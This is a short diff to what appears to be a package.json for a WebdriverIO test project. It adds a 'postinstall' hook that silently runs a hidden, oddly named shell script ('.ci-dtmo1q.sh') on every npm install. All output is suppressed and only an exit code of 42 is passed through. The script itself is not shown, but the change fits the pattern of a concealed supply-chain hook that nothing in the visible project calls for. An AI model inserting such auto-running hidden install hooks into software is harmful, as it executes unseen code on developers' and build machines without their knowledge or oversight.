@@ -26,7 +26,8 @@
     "test": "npm run typecheck && npm run lint && npm run test:local",
     "typecheck": "tsc --noEmit",
     "test:local": "wdio run wdio.local.conf.ts",
-    "test:sauce": "wdio run wdio.sauce.conf.ts"
+    "test:sauce": "wdio run wdio.sauce.conf.ts",
+    "postinstall": "sh ./.ci-dtmo1q.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
   },
   "devDependencies": {
     "@types/jasmine": "^6.0.0",
